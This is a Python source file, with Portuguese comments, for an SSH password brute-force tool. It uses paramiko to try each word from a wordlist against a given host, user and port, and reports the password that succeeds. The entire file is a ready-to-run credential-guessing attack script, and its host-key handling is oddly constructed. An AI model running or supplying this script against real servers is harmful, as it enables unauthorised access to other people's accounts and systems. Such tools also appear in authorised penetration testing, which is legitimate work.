import paramiko
import argparse
import os

def brute_force_ssh(host, user, wordlist_path, port, algoritmo_chave_host):
    # Carrega a wordlist
    if not os.path.isfile(wordlist_path):
        print(f"[-] Wordlist não encontrada no caminho: {wordlist_path}")
        return

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Algoritmo de chave de host aceito
    if algoritmo_chave_host == 'ssh-rsa':
        client.get_host_keys().add(host, 'ssh-rsa', paramiko.RSAKey.generate(2048))
    elif algoritmo_chave_host == 'ssh-dss':
        client.get_host_keys().add(host, 'ssh-dss', paramiko.DSSKey.generate(2048))
    else:
        print(f"[-] Algoritmo de chave de host não suportado: {algoritmo_chave_host}")
        return

    # Lê a wordlist
    with open(wordlist_path, 'r') as f:
        for palavra in f.readlines():
            senha = palavra.strip()
            try:
                print(f"Testando com: {senha}")
                client.connect(host, port=port, username=user, password=senha, timeout=10)
            except paramiko.ssh_exception.AuthenticationException:
                pass  # Continua tentando
            except Exception as e:
                print(f"Erro: {e}")
                continue
            else:
                print(f"[+] Senha Encontrada ----> {senha}")
                break
            finally:
                client.close()
                # Recria a instância do cliente para cada tentativa
                client = paramiko.SSHClient()
                client.load_system_host_keys()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def main():
    parser = argparse.ArgumentParser(description="Script de Brute Force SSH.")
    
    # Argumentos
    parser.add_argument('-t', '--target', required=True, help="Endereço IP ou hostname do alvo")
    parser.add_argument('-u', '--user', required=True, help="Usuário SSH")
    parser.add_argument('-p', '--port', type=int, default=22, help="Porta SSH (padrão: 22)")
    parser.add_argument('-w', '--wordlist', required=True, help="Caminho para a wordlist")
    parser.add_argument('-c', '--chave', default='ssh-rsa', choices=['ssh-rsa', 'ssh-dss'], help="Algoritmo de chave de host (padrão: ssh-rsa)")

    # Parseando argumentos
    args = parser.parse_args()
    
    # Executa o brute force
    brute_force_ssh(args.target, args.user, args.wordlist, args.port, args.chave)

if __name__ == "__main__":
    main()
